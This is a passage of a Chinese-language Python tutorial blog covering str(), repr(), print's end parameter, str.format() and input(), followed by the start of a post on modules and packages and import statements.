<li><font color="#FF7F00"><strong>str()：</strong></font> 将对象转化为适于人阅读的形式，函数返回一个对象的string格式。</li>
<li><font color="#FF7F00"><strong>repr()：</strong></font> 将对象转化为供解释器读取的形式，返回一个对象的 string 格式。可以输出包括转义字符在内的所有字符！</li>
<li><font color="#FF7F00"><strong><code>end=&#39; &#39;</code>：</strong></font> 循坏输出时常用于不换行输出。</li>
<li><font color="#FF7F00"><strong>str.format() ：</strong></font>格式化输出。</li>
</ul>
<br>

<p>举例：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">x = <span class="string">&quot;&#x27;abcd\ne\nfg&#x27;&quot;</span></span><br><span class="line">print(str(x))</span><br><span class="line">print(repr(x))</span><br><span class="line"></span><br><span class="line">output：</span><br><span class="line"><span class="string">&#x27;abcd</span></span><br><span class="line"><span class="string">e</span></span><br><span class="line"><span class="string">fg&#x27;</span></span><br><span class="line"><span class="string">&quot;&#x27;abcd\ne\nfg&#x27;&quot;</span></span><br><span class="line">------------------------------------------------------------------------------------------</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;repr() 的参数可以是 Python 的任何对象&#x27;&#x27;&#x27;</span></span><br><span class="line">x = <span class="number">10</span> * <span class="number">3.25</span></span><br><span class="line">y = <span class="number">200</span> * <span class="number">200</span></span><br><span class="line">print(repr((x, y, (<span class="string">&#x27;Google&#x27;</span>, <span class="string">&#x27;Runoob&#x27;</span>))))</span><br><span class="line"></span><br><span class="line">output： (<span class="number">32.5</span>, <span class="number">40000</span>, (<span class="string">&#x27;Google&#x27;</span>, <span class="string">&#x27;Runoob&#x27;</span>))</span><br><span class="line">------------------------------------------------------------------------------------------</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;  我们都知道正常情况下将多个字符串输出在一行直接使用半角逗号,分隔即可。但是循坏输出要想不换行就得</span></span><br><span class="line"><span class="string">使用 end=&#x27; &#x27;了  &#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">a = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>]</span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> a:</span><br><span class="line">  print(x)</span><br><span class="line">print(<span class="string">&#x27;\n----------分隔符-----------&#x27;</span>) </span><br><span class="line"><span class="keyword">for</span> y <span class="keyword">in</span> a: </span><br><span class="line">  print(y,end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">print(<span class="string">&#x27;\n----------分隔符-----------&#x27;</span>) </span><br><span class="line"><span class="keyword">for</span> y <span class="keyword">in</span> a: </span><br><span class="line">  print(y,end=<span class="string">&#x27;w&#x27;</span>)</span><br><span class="line">print(<span class="string">&#x27;\n----------分隔符-----------&#x27;</span>) </span><br><span class="line"><span class="keyword">for</span> y <span class="keyword">in</span> a: </span><br><span class="line">  print(y,end=<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">OUTPUT：</span><br><span class="line"><span class="number">1</span></span><br><span class="line"><span class="number">2</span></span><br><span class="line"><span class="number">3</span></span><br><span class="line"><span class="number">4</span></span><br><span class="line"><span class="number">5</span></span><br><span class="line"><span class="number">6</span></span><br><span class="line"></span><br><span class="line">----------分隔符-----------</span><br><span class="line"><span class="number">123456</span></span><br><span class="line">----------分隔符-----------</span><br><span class="line"><span class="number">1</span>w2w3w4w5w6w</span><br><span class="line">----------分隔符-----------</span><br><span class="line"><span class="number">1</span> <span class="number">2</span> <span class="number">3</span> <span class="number">4</span> <span class="number">5</span> <span class="number">6</span></span><br></pre></td></tr></table></figure>



<br>

<h4 id="7-3-str-format-格式化字符串"><a href="#7-3-str-format-格式化字符串" class="headerlink" title="7.3 str.format()格式化字符串"></a><font color="#3CB371" face="Comic sans MS">7.3 str.format()格式化字符串</font></h4><p>旧式的格式化输出在<font color="#00B2EE">[<a href="https://directoree.top/post/Python-Grammar">Python-基础语法</a>]</font>里面讲过，这里的<code>str.format()</code>就是新版的格式化的一种形式。</p>
<p><strong>语法：</strong>字符串类型格式化采用format()方法，基本使用格式是：<br><font color="#FF7F00">**&lt;模板字符串&gt;.format(&lt;逗号分隔的参数&gt;)**</font></p>
<p>所谓的**str.format()**：即<code>.format()</code>前是一个字符串，字符串里面有<code>&#123;&#125;</code>相当于旧书式的<code>%</code>。<code>&#123;&#125;</code>及其里面的字符 (称作格式化字段) 将会被 format() 中的参数替换。分为以下几种使用方法：</p>
<br>

<ol>
<li>在括号中的<font color="#FF7F00"><strong>数字</strong></font>用于指向传入对象在 format() 中的<font color="#FF7F00"><strong>索引位置</strong></font>，如下所示：</li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">print(<span class="string">&#x27;&#123;0&#125; 和 &#123;1&#125;&#x27;</span>.format(<span class="string">&#x27;Google&#x27;</span>, <span class="string">&#x27;Runoob&#x27;</span>))</span><br><span class="line">print(<span class="string">&#x27;&#123;1&#125; 和 &#123;0&#125;&#x27;</span>.format(<span class="string">&#x27;Google&#x27;</span>, <span class="string">&#x27;Runoob&#x27;</span>))</span><br><span class="line"></span><br><span class="line">OUTPUT：</span><br><span class="line">Google 和 Runoob</span><br><span class="line">Runoob 和 Google</span><br></pre></td></tr></table></figure>

<br>

<ol start="2">
<li>在 format() 中使用了<font color="#FF7F00"><strong>关键字参数, 那么它们的值会指向使用该名字的参数</strong></font>。也可以位置及关键字参数可以任意的结合:</li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">print(<span class="string">&#x27;&#123;0&#125; 和 &#123;1&#125;&#x27;</span>.format(<span class="string">&#x27;Google&#x27;</span>, <span class="string">&#x27;Runoob&#x27;</span>))</span><br><span class="line">print(<span class="string">&#x27;&#123;1&#125; 和 &#123;0&#125;&#x27;</span>.format(<span class="string">&#x27;Google&#x27;</span>, <span class="string">&#x27;Runoob&#x27;</span>))</span><br><span class="line">print(<span class="string">&#x27;站点列表 &#123;0&#125;, &#123;1&#125;, 和 &#123;other&#125;。&#x27;</span>.format(<span class="string">&#x27;Google&#x27;</span>, <span class="string">&#x27;Runoob&#x27;</span>,</span><br><span class="line">                                                       other=<span class="string">&#x27;Taobao&#x27;</span>))</span><br><span class="line"></span><br><span class="line">OUTPUT：</span><br><span class="line">Google 和 Runoob</span><br><span class="line">Runoob 和 Google</span><br><span class="line">站点列表 Google, Runoob, 和 Taobao。</span><br></pre></td></tr></table></figure>

<br>

<ol start="3">
<li>在 <code>&#123;&#125;</code> 里使用 <code>!a</code> (使用 ascii()), <code>!s</code>(使用 str()) 和 <code>!r</code> (使用 repr()) 可以用于<font color="#FF7F00"><strong>在格式化某个值之前对其进行转化</strong></font>:</li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> math</span><br><span class="line">print(<span class="string">&#x27;常量 PI 的值近似为： &#123;&#125;。&#x27;</span>.format(math.pi))</span><br><span class="line">print(<span class="string">&#x27;常量 PI 的值近似为： &#123;!s&#125;。&#x27;</span>.format(math.pi))</span><br><span class="line"></span><br><span class="line">OUTPUT:</span><br><span class="line">常量 PI 的值近似为： <span class="number">3.141592653589793</span>。</span><br><span class="line">常量 PI 的值近似为： <span class="number">3.141592653589793</span>。</span><br></pre></td></tr></table></figure>

<br>

<ol start="4">
<li>可选项 <code>:</code> 和格式标识符可以跟着字段名。 这就允许对值进行更好的格式化。</li>
</ol>
<p>format()方法中&lt;模板字符串&gt;的<code>&#123;&#125;</code>除了包括参数序号，还可以包括格式控制信息。此时，<code>&#123;&#125;</code>的内部样式如下：</p>
<p><font color="#FF7F00">     <strong>{&lt;参数序号&gt;: &lt;格式控制标记&gt;}</strong>  </font><br>     <br>其中，&lt;格式控制标记&gt;用来控制参数显示时的格式，包括：**&lt;填充&gt;&lt;对齐&gt;&lt;宽度&gt;,&lt;.精度&gt;&lt;类型&gt;** 6 个字段，这些字段都是可选的，可以组合使用，逐一介绍如下。参考：<font color="#00B2EE">[<a href="https://blog.csdn.net/i_chaoren/article/details/77922939">Python字符串格式化–format()方法</a>]</font></p>
<p><img data-src="https://i.loli.net/2019/03/06/5c7f917b8902b.jpg" alt="1.jpg"></p>
<br>

<p><strong>&lt;宽度&gt;</strong><br>指当前槽的设定输出字符宽度，如果该槽对应的format()参数长度比&lt;宽度&gt;设定值大，则使用参数实际长度。如果该值的实际位数小于指定宽度，则位数将被默认以空格字符补充。</p>
<p><strong>&lt;对齐&gt;</strong><br>指参数在&lt;宽度&gt;内输出时的对齐方式，分别使用&lt;、&gt;和^三个符号表示左对齐、右对齐和居中对齐。</p>
<p><strong>&lt;填充&gt;</strong><br>指&lt;宽度&gt;内除了参数外的字符采用什么方式表示，默认采用空格，可以通过&lt;填充&gt;更换。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">s = <span class="string">&quot;PYTHON&quot;</span></span><br><span class="line"> </span><br><span class="line"><span class="string">&quot;&#123;0:30&#125;&quot;</span>.format(s)</span><br><span class="line">Out[<span class="number">17</span>]: <span class="string">&#x27;PYTHON                        &#x27;</span></span><br><span class="line"> </span><br><span class="line"><span class="string">&quot;&#123;0:&gt;30&#125;&quot;</span>.format(s)</span><br><span class="line">Out[<span class="number">18</span>]: <span class="string">&#x27;                        PYTHON&#x27;</span></span><br><span class="line"> </span><br><span class="line"><span class="string">&quot;&#123;0:*^30&#125;&quot;</span>.format(s)</span><br><span class="line">Out[<span class="number">19</span>]: <span class="string">&#x27;************PYTHON************&#x27;</span></span><br><span class="line"> </span><br><span class="line"><span class="string">&quot;&#123;0:-^30&#125;&quot;</span>.format(s)</span><br><span class="line">Out[<span class="number">20</span>]: <span class="string">&#x27;------------PYTHON------------&#x27;</span></span><br><span class="line"> </span><br><span class="line"><span class="string">&quot;&#123;0:3&#125;&quot;</span>.format(s)</span><br><span class="line"></span><br><span class="line">Out[<span class="number">21</span>]: <span class="string">&#x27;PYTHON&#x27;</span></span><br></pre></td></tr></table></figure>

<br>

<p><strong>逗号（，）</strong><br>&lt;格式控制标记&gt;中逗号（，）用于显示数字的千位分隔符，例如：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="string">&quot;&#123;0:-^20,&#125;&quot;</span>.format(<span class="number">1234567890</span>)</span><br><span class="line">Out[<span class="number">24</span>]: <span class="string">&#x27;---1,234,567,890----&#x27;</span></span><br><span class="line"> </span><br><span class="line"><span class="string">&quot;&#123;0:-^20&#125;&quot;</span>.format(<span class="number">1234567890</span>) <span class="comment">#对比输出</span></span><br><span class="line">Out[<span class="number">25</span>]: <span class="string">&#x27;-----1234567890-----&#x27;</span></span><br><span class="line"> </span><br><span class="line"><span class="string">&quot;&#123;0:-^20,&#125;&quot;</span>.format(<span class="number">12345.67890</span>)</span><br><span class="line">Out[<span class="number">26</span>]: <span class="string">&#x27;----12,345.6789-----&#x27;</span></span><br></pre></td></tr></table></figure>

<br>

<p><strong>&lt;.精度&gt;</strong><br>表示两个含义，由小数点（.）开头。对于浮点数，精度表示小数部分输出的有效位数。对于字符串，精度表示输出的最大长度。</p>
<p><strong>&lt;类型&gt;</strong><br>表示输出整数和浮点数类型的格式规则。对于整数类型，输出格式包括6 种：</p>
<ul>
<li>b: 输出整数的二进制方式；</li>
<li>c: 输出整数对应的 Unicode 字符；</li>
<li>d: 输出整数的十进制方式；</li>
<li>o: 输出整数的八进制方式；</li>
<li>x: 输出整数的小写十六进制方式；</li>
<li>X: 输出整数的大写十六进制方式；</li>
</ul>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>table = &#123;<span class="string">&#x27;Google&#x27;</span>: <span class="number">1</span>, <span class="string">&#x27;Runoob&#x27;</span>: <span class="number">2</span>, <span class="string">&#x27;Taobao&#x27;</span>: <span class="number">3</span>&#125;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">for</span> name, number <span class="keyword">in</span> table.items():</span><br><span class="line"><span class="meta">... </span>    print(<span class="string">&#x27;&#123;0:10&#125; ==&gt; &#123;1:10d&#125;&#x27;</span>.format(name, number))</span><br><span class="line">...</span><br><span class="line">Runoob     ==&gt;          2</span><br><span class="line">Taobao     ==&gt;          3</span><br><span class="line">Google     ==&gt;          1</span><br></pre></td></tr></table></figure>


<p>对于<strong>浮点数类型</strong>，输出格式包括4 种：</p>
<ul>
<li>e: 输出浮点数对应的小写字母 e 的指数形式；</li>
<li>E: 输出浮点数对应的大写字母 E 的指数形式；</li>
<li>f: 输出浮点数的标准浮点形式；</li>
<li>%: 输出浮点数的百分形式。</li>
</ul>
<br>

<ol start="5">
<li>如果你有一个很长的格式化字符串, 而你不想将它们分开, 那么在格式化时通过变量名而非位置会是很好的事情。</li>
</ol>
<p>最简单的就是传入一个字典, 然后使用方括号 <code>[]</code> 来访问键值 :</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>table = &#123;<span class="string">&#x27;Google&#x27;</span>: <span class="number">1</span>, <span class="string">&#x27;Runoob&#x27;</span>: <span class="number">2</span>, <span class="string">&#x27;Taobao&#x27;</span>: <span class="number">3</span>&#125;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>print(<span class="string">&#x27;Runoob: &#123;0[Runoob]:d&#125;; Google: &#123;0[Google]:d&#125;; Taobao: &#123;0[Taobao]:d&#125;&#x27;</span>.format(table))</span><br><span class="line">Runoob: <span class="number">2</span>; Google: <span class="number">1</span>; Taobao: <span class="number">3</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">也可以通过在 table 变量前使用 <span class="string">&#x27;**&#x27;</span> 来实现相同的功能：</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>table = &#123;<span class="string">&#x27;Google&#x27;</span>: <span class="number">1</span>, <span class="string">&#x27;Runoob&#x27;</span>: <span class="number">2</span>, <span class="string">&#x27;Taobao&#x27;</span>: <span class="number">3</span>&#125;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>print(<span class="string">&#x27;Runoob: &#123;Runoob:d&#125;; Google: &#123;Google:d&#125;; Taobao: &#123;Taobao:d&#125;&#x27;</span>.format(**table))</span><br><span class="line">Runoob: <span class="number">2</span>; Google: <span class="number">1</span>; Taobao: <span class="number">3</span></span><br></pre></td></tr></table></figure>

<br>

<h3 id="八-输入-input"><a href="#八-输入-input" class="headerlink" title="八. 输入(input)"></a><font color="#FF6347" face="Comic sans MS">八. 输入(input)</font></h3><blockquote>
<ol>
<li>函数input()让程序暂停运行，等待用户输入一些文本。获取用户输入后，Python将其存储在一个变量（指针）中，以方便你使用。</li>
<li>input()函数有个返回值，<font color="#FF7F00"><strong>返回类型为String</strong></font>。</li>
</ol>
</blockquote>
<br>

<p><font color="red"><strong>一、参数</strong></font></p>
<p>输入分为两种：<strong>空参数</strong>、<strong>带有参数</strong>。</p>
<p><font color="#00B2EE"><strong>空参数：</strong></font><code>input()</code>；效果是屏幕上没有任何提示，等待用户输入。<br><font color="#00B2EE"><strong>带有参数：</strong></font><code>input(&#39;请输入一个字符串：&#39;)</code>；效果是屏幕上显示“请输入一个字符串：”，然后等待用户输入。</p>
<p><font color="red"><strong>二、返回值</strong></font></p>
<p>关于input()的返回值，是<font color="#FF7F00"><strong>字符串String类型</strong></font><br>如下会报错，假如输入1998，返回给s的值是字符串”1998”，如果直接和数字型进行比较会报错：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">s = input(<span class="string">&#x27;birth: &#x27;</span>)</span><br><span class="line">birth = s</span><br><span class="line"><span class="keyword">if</span> birth &lt; <span class="number">2000</span>:</span><br><span class="line">    print(<span class="string">&#x27;00前&#x27;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    print(<span class="string">&#x27;00后&#x27;</span>)</span><br></pre></td></tr></table></figure>

<br>

<p>解决方法是使用函数<code>int(str)</code>，功能是<font color="#FF7F00"><strong>将字符串类型转换成数字型</strong></font>。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">s = input(<span class="string">&#x27;birth: &#x27;</span>)</span><br><span class="line">birth = int(s)</span><br><span class="line"><span class="keyword">if</span> birth &lt; <span class="number">2000</span>:</span><br><span class="line">    print(<span class="string">&#x27;00前&#x27;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    print(<span class="string">&#x27;00后&#x27;</span>)</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>Python</category>
      </categories>
      <tags>
        <tag>Python语言</tag>
      </tags>
  </entry>
  <entry>
    <title>Python-模块和包</title>
    <url>/post/Python-Modules-Packages/</url>
    <content><![CDATA[<p>from…import…😀</p>
<a id="more"></a>


<br>

<br>

<center><font color="#00B2EE" face="Comic sans MS" size=5>模块和包</font> </center>

<br>

<br>

<h3 id="一-模块与包的意义"><a href="#一-模块与包的意义" class="headerlink" title="一. 模块与包的意义"></a><font color="#FF6347" face="Comic sans MS">一. 模块与包的意义</font></h3><br>

<h4 id="1-1-什么是模块？"><a href="#1-1-什么是模块？" class="headerlink" title="1.1 什么是模块？"></a><font color="#3CB371" face="Comic sans MS">1.1 什么是模块？</font></h4><blockquote>
<p><font color="#FF7F00" face="Microsoft YaHei"><strong>在Python中，一个.py文件就称之为一个模块（Module）。</strong></font></p>
</blockquote>
<br>


<h4 id="1-2-为什么要使用模块？"><a href="#1-2-为什么要使用模块？" class="headerlink" title="1.2 为什么要使用模块？"></a><font color="#3CB371" face="Comic sans MS">1.2 为什么要使用模块？</font></h4><ul>
<li><font face="Microsoft YaHei">为了编写可维护的代码，我们把很多函数分组，分别放到不同的文件里，这样，每个文件包含的代码就相对较少，很多编程语言都采用这种组织代码的方式。</font></li>
</ul>
<ul>
<li><font face="Microsoft YaHei">随着程序的发展，功能越来越多，为了方便管理，我们通常将程序分成一个个的文件，这样做程序的结构更清晰，方便管理。这时我们不仅仅可以把这些文件当做脚本去执行，还可以把他们当做模块来导入到其他的模块中，实现了功能的重复利用。</font></li>
</ul>
<ul>
<li><font face="Microsoft YaHei">我们在编写程序的时候，也经常引用其他模块，包括Python内置的模块和来自第三方的模块。</font></li>
</ul>
<ul>
<li><font face="Microsoft YaHei">使用模块还可以避免函数名和变量名冲突。相同名字的函数和变量完全可以分别存在不同的模块中，因此，我们自己在编写模块时，不必考虑名字会与其他模块冲突。但是也要注意，尽量不要与内置函数名字冲突。</font></li>
</ul>
<br>


<h4 id="1-3-什么是包？"><a href="#1-3-什么是包？" class="headerlink" title="1.3 什么是包？"></a><font color="#3CB371" face="Comic sans MS">1.3 什么是包？</font></h4><ol>
<li><font face="Microsoft YaHei">如果不同的人编写的模块名相同怎么办？为了避免模块名冲突，Python又引入了按目录（文件夹）来组织模块的方法，称为包（Package）。</font></li>
</ol>
<ol start="2">
<li><font face="Microsoft YaHei">包是目录级的（文件夹级），文件夹是用来组成py文件（包的本质就是一个包含<code>__init__.py</code>文件的目录）</font></li>
</ol>
<ol start="3">
<li><font face="Microsoft YaHei"><font color="#FF7F00"><strong>每一个包目录下面都会有一个 <code>__init__.py</code> 的文件，这个文件是必须存在的，否则，Python就把这个目录当成普通目录，而不是一个包</strong></font>。它可以是空文件，也可以有Python代码，因为 <code>__init__.py</code> 本身就是一个模块。</font></li>
</ol>
<ol start="4">
<li><font face="Microsoft YaHei">import导入文件时，产生名称空间中的名字来源于文件，import 包，产生的名称空间的名字同样来源于文件，即包下的 <code>__init__.py</code> ，<font color="#FF7F00"><strong>导入包本质就是在导入该文件</strong></font>。</font></li>
</ol>
<ol start="5">
<li><font face="Microsoft YaHei">文件夹里面还可以包含文件夹（可以有多级目录，组成多级层次的包结构）。但是每一个文件夹下面必须有一个 <code>__init__.py</code> 文件。</font></li>
</ol>
<ol start="6">
<li><font face="Microsoft YaHei">自己创建模块时要注意命名，不能和Python自带的模块名称冲突。例如，系统自带了sys模块，自己的模块就不可命名为sys.py，否则将无法导入系统自带的sys模块。</font></li>
</ol>
<br>

<p><font face="Comic sans MS"><strong>举例说明：</strong></font></p>
<p>有个包按照如下目录存放文件：</p>
<p>mycompany<br>├─ __init__.py<br>├─ abc.py<br>└─ xyz.py</p>
<blockquote>
<p><font face="Microsoft YaHei">引入了包以后，只要顶层的包名不与别人冲突，那所有模块都不会与别人冲突。现在，**<code>abc.py</code>** 模块的名字就变成了 <strong><code>mycompany.abc</code></strong> ，类似的，**<code>xyz.py</code>** 的模块名变成了 <strong><code>mycompany.xyz</code></strong> 。</font></p>
</blockquote>
<br>

<p>类似的，可以有多级目录，组成多级层次的包结构。比如如下的目录结构：</p>
<p>mycompany<br> ├─ web<br> │  ├─ __init__.py<br> │  ├─ utils.py<br> │  └─ <a href="http://www.py/">www.py</a><br> ├─ __init__.py<br> ├─ abc.py<br> └─ xyz.py</p>
<blockquote>
<p><font face="Microsoft YaHei">文件<code>www.py</code> 的模块名就是<code>mycompany.web.www</code>，两个文件utils.py的模块名分别是<code>mycompany.utils</code>和 <code>mycompany.web.utils</code></font></p>
</blockquote>
<br>

<p><font color="#00B2EE" face="Comic sans MS"><strong>总结</strong><br></font></p>
<p><font face="Microsoft YaHei">模块是一组Python代码的集合，可以使用其他模块，也可以被其他模块使用。<br></font></p>
<blockquote>
<p><font color="#FF7F00" face="Microsoft YaHei"><strong>创建自己的模块时，要注意：</strong></font></p>
<ol>
<li><font face="Microsoft YaHei"> 模块名要遵循Python变量命名规范，不要使用中文、特殊字符；</font></li>
<li><font face="Microsoft YaHei">模块名不要和系统模块名冲突，最好先查看系统是否已存在该模块，检查方法是在Python交互环境执行import abc，若成功则说明系统存在此模块。</font></li>
</ol>
</blockquote>
<br>

<br>

<h3 id="二-使用模块-无包组织"><a href="#二-使用模块-无包组织" class="headerlink" title="二. 使用模块 -- 无包组织"></a><font color="#FF6347" face="Comic sans MS">二. 使用模块 -- 无包组织</font></h3><br>

<blockquote>
<p><font color="#FF7F00"><strong>使用模块的几种语句：</strong></font></p>
</blockquote>
<ol>
<li><font face="Microsoft YaHei"><strong>import 语句：</strong> <strong><code>import module1[, module2[,... moduleN]</code></strong></font></li>
<li><font face="Microsoft YaHei"><strong>from … import 语句：</strong> <strong><code>from  modname import  name1[, name2[, ... nameN]]</code></strong> </font></li>
<li><font face="Microsoft YaHei">*<em>from … import * 语句：*</em> <strong><code>from  modname import *</code></strong></font></li>
<li><font face="Microsoft YaHei"><strong>__name__属性：</strong> 用来分清该模块是调用者还是被其他模块调用。</font></li>
<li><font face="Microsoft YaHei"><strong>dir() 函数：</strong> 用来查找模块中定义的名字，返回一个有序字符串列表。</font></li>
</ol>
<br>

<h4 id="2-1-import-语句"><a href="#2-1-import-语句" class="headerlink" title="2.1 import 语句"></a><font color="#3CB371" face="Comic sans MS">2.1 import 语句</font></h4><p><font face="Microsoft YaHei">想使用 Python 源文件，只需在另一个源文件里执行 import 语句，语法如下：</font></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> module1[, module2[,... moduleN]</span><br></pre></td></tr></table></figure>

<ol>
<li><p><font face="Microsoft YaHei">使用 Python 源文件，只需在另一个源文件里执行 import 语句。</font></p>
</li>
<li><p><font face="Microsoft YaHei">一个模块只会被导入一次，不管你执行了多少次import。这样可以防止导入模块被一遍又一遍地执行。</font></p>
</li>
<li><p><font face="Microsoft YaHei">调用者引用模块后可以：<code>模块名.函数名(参数)</code>来使用。</font></p>
</li>
</ol>
<br>

<p>举例说明：<br>当解释器遇到 import 语句，如果模块在当前的搜索路径就会被导入。如想要导入模块 support，需要把命令放在脚本的顶端：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">support.py 文件代码</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">print_func</span>(<span class="params"> par </span>):</span></span><br><span class="line">    <span class="keyword">print</span> (<span class="string">&quot;Hello : &quot;</span>, par)</span><br><span class="line">    <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">------------------------------------------------------------------------------------------</span><br><span class="line">------------------------------------------------------------------------------------------</span><br><span class="line">test.py 文件代码</span><br><span class="line"><span class="comment"># 导入模块</span></span><br><span class="line"><span class="keyword">import</span> support</span><br><span class="line"> </span><br><span class="line"><span class="comment"># 现在可以调用模块里包含的函数了</span></span><br><span class="line">support.print_func(<span class="string">&quot;Runoob&quot;</span>)</span><br><span class="line">------------------------------------------------------------------------------------------</span><br><span class="line">运行test.py实例输出结果：</span><br><span class="line">Hello :  Runoob</span><br></pre></td></tr></table></figure>

<br>

<h4 id="2-2-from-…-import-语句"><a href="#2-2-from-…-import-语句" class="headerlink" title="2.2 from … import 语句"></a><font color="#3CB371" face="Comic sans MS">2.2 from … import 语句</font></h4><p><font face="Microsoft YaHei">Python 的 from 语句让你从模块中导入一个指定的部分到当前命名空间中，<strong>这种访问函数时可以直接使用函数名而不需要前缀</strong>，语法如下：</font></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> modname <span class="keyword">import</span> name1[, name2[, ... nameN]]</span><br></pre></td></tr></table></figure>

<br>

<p>举例说明：<br>例如，要导入模块 fibo 的 fib 函数，使用如下语句：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">fibo.py</span><br><span class="line"><span class="comment"># 斐波那契(fibonacci)数列模块</span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fib</span>(<span class="params">n</span>):</span>    <span class="comment"># 定义到 n 的斐波那契数列</span></span><br><span class="line">    a, b = <span class="number">0</span>, <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> b &lt; n:</span><br><span class="line">        print(b, end=<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">        a, b = b, a+b</span><br><span class="line">    print()   //输出为<span class="literal">None</span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fib2</span>(<span class="params">n</span>):</span> <span class="comment"># 返回到 n 的斐波那契数列</span></span><br><span class="line">    result = []</span><br><span class="line">    a, b = <span class="number">0</span>, <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> b &lt; n:</span><br><span class="line">        result.append(b)</span><br><span class="line">        a, b = b, a+b</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line">------------------------------------------------------------------------------------------</span><br><span class="line">------------------------------------------------------------------------------------------</span><br><span class="line">test.py</span><br><span class="line"><span class="keyword">from</span> fibo <span class="keyword">import</span> fib, fib2</span><br><span class="line">print(fib(<span class="number">500</span>))</span><br><span class="line">print(fib2(<span class="number">500</span>))</span><br><span class="line"></span><br><span class="line">运行结果：</span><br><span class="line"><span class="number">1</span> <span class="number">1</span> <span class="number">2</span> <span class="number">3</span> <span class="number">5</span> <span class="number">8</span> <span class="number">13</span> <span class="number">21</span> <span class="number">34</span> <span class="number">55</span> <span class="number">89</span> <span class="number">144</span> <span class="number">233</span> <span class="number">377</span></span><br><span class="line"><span class="literal">None</span></span><br><span class="line">[<span class="number">1</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">8</span>, <span class="number">13</span>, <span class="number">21</span>, <span class="number">34</span>, <span class="number">55</span>, <span class="number">89</span>, <span class="number">144</span>, <span class="number">233</span>, <span class="number">377</span>]</span><br></pre></td></tr></table></figure>

<br>

<h4 id="2-3-from-…-import-语句"><a href="#2-3-from-…-import-语句" class="headerlink" title="2.3 from … import * 语句"></a><font color="#3CB371" face="Comic sans MS">2.3 from … import * 语句</font></h4><ul>
<li><p><font face="Microsoft YaHei">这提供了一个简单的方法来导入一个模块中的所有项目。然而这种声明不该被过多地使用。</font></p>
</li>
<li><p><font face="Microsoft YaHei">这种方法，可以一次性的把模块中的所有（函数，变量）名称都导入到当前模块的字符表。</font></p>
</li>
<li><p><font face="Microsoft YaHei">这将把所有的名字都导入进来，但是那些由单一下划线（_）开头的名字不在此例。大多数情况， Python程序员不使用这种方法，因为引入的其它来源的命名，很可能覆盖了已有的定义。</font></p>
</li>
</ul>
<br>

<p>把一个模块的所有内容全都导入到当前的命名空间也是可行的，只需使用如下声明：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> modname <span class="keyword">import</span> *</span><br></pre></td></tr></table></figure>




<br>

<br>

<h3 id="三-使用模块-有包组织"><a href="#三-使用模块-有包组织" class="headerlink" title="三. 使用模块 -- 有包组织"></a><font color="#FF6347" face="Comic sans MS">三. 使用模块 -- 有包组织</font></h3><ul>
<li><p><font face="Microsoft YaHei">目录只有包含一个叫做 <code>__init__.py</code> 的文件才会被认作是一个包，主要是为了避免一些滥俗的名字（比如叫做 string）不小心的影响搜索路径中的有效模块。</font></p>
</li>
<li><p><font face="Microsoft YaHei">最简单的情况，放一个空的 <code>__init__.py</code>就可以了。当然这个文件中也可以包含一些初始化代码或者为（将在后面介绍的） <code>__all__</code>变量赋值。</font></p>
</li>
</ul>
<br>

<p><font color="#00B2EE" face="Comic sans MS">1. <strong>import 语句：</strong></font></p>
<p>用户可以每次只导入一个包里面的特定模块，他必须使用全名去访问:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> 包名.子包名.模块名                 导入模块</span><br><span class="line"></span><br><span class="line">包名.子包名.模块名 .函数名(参数)           使用模块</span><br></pre></td></tr></table></figure>

<br>

<p><font color="#00B2EE" face="Comic sans MS">2. <strong>import …from 语句：</strong></font>    </p>
<p>同样会导入子模块，他不需要那些冗长的前缀，只需要<code>模块名.函数名(参数)</code>即可，推荐使用！</p>
